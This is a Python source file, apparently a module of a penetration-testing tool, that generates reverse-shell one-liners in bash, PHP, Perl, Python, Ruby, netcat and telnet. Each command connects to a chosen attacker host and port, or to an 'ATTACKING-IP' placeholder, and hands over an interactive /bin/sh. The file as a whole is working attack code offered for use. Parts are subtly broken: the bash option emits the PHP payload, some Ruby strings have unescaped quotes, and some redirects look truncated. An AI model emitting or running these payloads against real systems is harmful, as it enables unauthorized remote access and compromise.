#!/usr/bin/python

from core.colors import COLORS
from time import sleep


# Create shell code
def createShell(script, os, host, port, msg):
    msg += "\n\n" + COLORS.fg.green + "[*]" + COLORS.reset + " Your " + script + " script:"
    if script == "bash":
        bash(host, port, msg)
    elif script == "php":
        php(host, port, msg)
    elif script == "perl":
        perl(os, host, port, msg)
    elif script == "python":
        python(host, port, msg)
    elif script == "ruby":
        ruby(os, host, port, msg)
    elif script == "netcat":
        netcat(host, port, msg)
    elif script == "telnet":
        telnet(host, port, msg)
    # COMING SOON
    # elif script == "xterm":
    #     xterm()


# Bash scripts for unix and windows os.
def bash(host, port, msg):
    # Global vars.
    global code, finalcode
    code, finalcode = "", ""

    # If ip and port provided.
    if host and port:
        code = "php -r '$sock=fsockopen(" + '"' + host + '"' + "," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    # If ip and port are NOT provided.
    else:
        code = "php -r '$sock=fsockopen(\"ATTACKING-IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    # Create final codes
    finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n"

    print msg
    sleep(2)
    print finalcode


# PHP scripts for unix and windows os.
def php(host, port, msg):
    # Global vars.
    global code, finalcode
    code, finalcode = "", ""

    # If ip and port provided.
    if host and port:
        code = "php -r '$sock=fsockopen(" + '"' + host + '"' + "," + port + ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    # If ip and port are NOT provided.
    else:
        code = "php -r '$sock=fsockopen(\"ATTACKING-IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"

    # Create final codes
    finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n"

    print msg
    sleep(20)
    print finalcode


# Perl scripts for unix and windows os.
def perl(os, host, port, msg):
    # Global vars.
    global code, additionalmsg, secondcode, finalcode
    code, additionalmsg, secondcode, finalcode = "", "", "", ""

    # If linux os selected:
    if os == "l" or os == "linux":
        # If ip and port provided.
        if host and port:
            code = "perl -e 'use Socket;$i=" + '"' + host + '"' + ";$p=" + port + ";" \
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");" \
                     "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" + COLORS.reset
            additionalmsg = "\n" + COLORS.fg.orange + "[!*]" + COLORS.reset + \
                         " Shorter Perl reverse shell that does not depend on /bin/sh:\n"
            secondcode = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"\
                      + '"' + host + ":" + port + ");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

        # If ip and port are NOT provided.
        else:
            code = "perl -e 'use Socket;$i=\"ATTACKING-IP\";$p=PORT;" \
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");" \
                     "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" + COLORS.reset
            additionalmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                         " Shorter Perl reverse shell that does not depend on /bin/sh:\n"
            secondcode = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"\
                      "\"ATTACKING-IP:PORT\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

        # Create final codes
        finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n" + \
          additionalmsg + "\n" + COLORS.bold + secondcode + COLORS.reset + "\n"

    # If windows os selected:
    elif os == "w" or os == "windows":
        # If ip and port provided.
        if host and port:
            code = "perl -e 'use Socket;$i=" + '"' + host + '"' + ";$p=" + port + ";" \
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");" \
                     "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" + COLORS.reset
            additionalmsg = "\n" + COLORS.fg.orange + "[!*]" + COLORS.reset + \
                         " Second Perl script for Windows:\n"
            secondcode = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr," \
                      + '"' + host + ":" + port + ");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

        # If ip and port are NOT provided.
        else:
            code = "perl -e 'use Socket;$i=\"ATTACKING-IP\";$p=PORT;" \
                     "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));" \
                     "if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");" \
                     "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" + COLORS.reset
            additionalmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                         " Second Perl script for Windows:\n"
            secondcode = "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr," \
                      "\"ATTACKING-IP:PORT\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"

        # Create final codes
        finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n" + \
          additionalmsg + "\n" + COLORS.bold + secondcode + COLORS.reset + "\n"

    print msg
    sleep(20)
    print finalcode


# Python script for unix and windows os.
def python(host, port, msg):
    # Global vars.
    global code, finalcode
    code, finalcode = "", ""

    # If ip and port provided.
    if host and port:
        code = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" \
                 "s.connect((" + '"' + host + '"' + "," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" \
                 " os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    # If ip and port are NOT provided.
    else:
        code = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);" \
                 "s.connect((\"ATTACKING-IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);" \
                 " os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    # Create final codes
    finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n"

    print msg
    sleep(2)
    print finalcode


# Ruby scripts for unix and windows os.
def ruby(os, host, port, msg):
    # Global vars.
    global code, additionalmsg, secondcode, finalcode
    code, additionalmsg, secondcode, finalcode = "", "", "", ""

    # If linux os selected:
    if os == "l" or os == "linux":
        # If ip and port provided.
        if host and port:
            code = "ruby -rsocket -e'f=TCPSocket.open(" + '"' + host + '"' + "," + port + ").to_i;" \
                   "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" + COLORS.reset
            additionalmsg = "\n" + COLORS.fg.orange + "[!*]" + COLORS.reset + \
                         " Longer Ruby reverse shell that does not depend on /bin/sh:\n"
            secondcode = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(" \
                         + '"' + host + '"' + "," + '"' + port + '"' + ");" \
                         "while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"

        # If ip and port are NOT provided.
        else:
            code = "ruby -rsocket -e'f=TCPSocket.open(\"ATTACKING-IP\",PORT).to_i;" \
                   "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" + COLORS.reset
            additionalmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                         " Longer Ruby reverse shell that does not depend on /bin/sh:\n"
            secondcode = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"ATTACKING-IP\",\"PORT\");" \
                         "while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"

        # Create final codes
        finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n" + \
                        additionalmsg + "\n" + COLORS.bold + secondcode + COLORS.reset + "\n"

    # If windows os selected:
    elif os == "w" or os == "windows":

        # If ip and port provided.
        if host and port:
            code = "ruby -rsocket -e 'c=TCPSocket.new(" + '"' + host + '"' + "," + '"' + port + '"' + ");" \
                   "while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"

        # If ip and port are NOT provided.
        else:
            code = "ruby -rsocket -e 'c=TCPSocket.new(\"ATTACKING-IP\",\"PORT\");" \
                   "while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"

        # Create final codes
        finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n"

    print msg
    sleep(2)
    print finalcode


# Netcat (nc), (ncat) scripts for unix and windows os.
def netcat(host, port, msg):
    # Global vars.
    global code, secondmsg, secondcode, thirdcode, finalcode
    code, secondmsg, secondcode, thirdcode, finalcode = "", "", "", "", ""

    # If ip and port provided.
    if host and port:
        code = "nc " + host + " " + port + " -e /bin/sh"
        secondmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                    " Others possible Netcat reverse shells, depending on the Netcat version and compilation flags:\n"
        secondcode = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + host + " " + port + " >/tmp/f"
        thirdcode = "rm -f /tmp/p; mknod /tmp/p p && nc " + host + " " + port + " 0/tmp/p"

    # If ip and port are NOT provided.
    else:
        code = "nc ATTACKING-IP PORT -e /bin/sh"
        secondmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                    " Others possible Netcat reverse shells, depending on the Netcat version and compilation flags:\n"
        secondcode = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKING-IP PORT >/tmp/f"
        thirdcode = "rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP PORT 0/tmp/p"

    # Create final codes
    finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n" + \
                secondmsg + "\n" + COLORS.bold + secondcode + COLORS.reset + "\n" \
                + "\n" + COLORS.bold + thirdcode + COLORS.reset + "\n"

    print msg
    sleep(2)
    print finalcode


# Telnet scripts for unix and windows os.
def telnet(host, port, msg):
    # Global vars.
    global code, secondmsg, secondcode, thirdcode, finalcode
    code, secondmsg, secondcode, thirdcode, finalcode = "", "", "", "", ""

    # If ip and port provided.
    if host and port:
        code = "rm -f /tmp/p; mknod /tmp/p p && telnet " + host + " " + port + " 0/tmp/p"
        secondmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                    " Others possible Telnet reverse shells, depending on the Netcat version and compilation flags:\n" \
                    + COLORS.fg.red + "[*!!!]" + COLORS.reset + \
                    " Important: Open two listeners on your machine on " + port + " and any other PORT, like 4445\n"
        secondcode = "telnet " + host + " " + port + " | /bin/sh | telnet " + host + " 4445"

    # If ip and port are NOT provided.
    else:
        code = "rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP PORT 0/tmp/p"
        secondmsg = "\n" + COLORS.fg.orange + "[*!]" + COLORS.reset + \
                    " Others possible Telnet reverse shells, depending on the Netcat version and compilation flags:\n" \
                    + COLORS.fg.red + "[*!!!]" + COLORS.reset + \
                    " Important: Open two listeners on your machine on PORT(1), " \
                    "like 4444 and any other PORT(2), like 4445\n"
        secondcode = "telnet ATTACKING-IP PORT(1) | /bin/sh | telnet ATTACKING-IP PORT(2)"

    # Create final codes
    finalcode = "\n" + COLORS.bold + code + COLORS.reset + "\n" + \
                secondmsg + "\n" + COLORS.bold + secondcode + COLORS.reset + "\n" \

    print msg
    sleep(2)
    print finalcode


# COMING SOON
# Xterm scripts for unix and windows os.
# def xterm():
#     print "ok"
